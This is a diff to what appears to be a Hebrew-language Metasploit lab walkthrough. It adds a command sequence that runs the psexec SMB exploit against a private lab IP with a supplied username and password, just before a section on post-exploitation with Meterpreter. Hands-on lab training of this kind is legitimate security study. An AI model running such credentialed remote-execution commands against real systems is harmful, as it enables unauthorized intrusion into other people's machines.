@@ -178,6 +178,16 @@ help
 
 <img width="923" height="682" alt="image" src="https://github.com/user-attachments/assets/c9c2d619-cd66-43be-95e6-92e066b10f11" />
 
+use exploit/windows/smb/psexec
+
+set smbuser ballen
+set smbpass Password1
+
+set rhosts 10.65.189.26
+
+run
+
+
 משימה 4: Post-Exploitation עם Meterpreter
 
 שלב Post-Exploitation הוא השלב שמגיע אחרי שכבר הושגה גישה למערכת היעד.
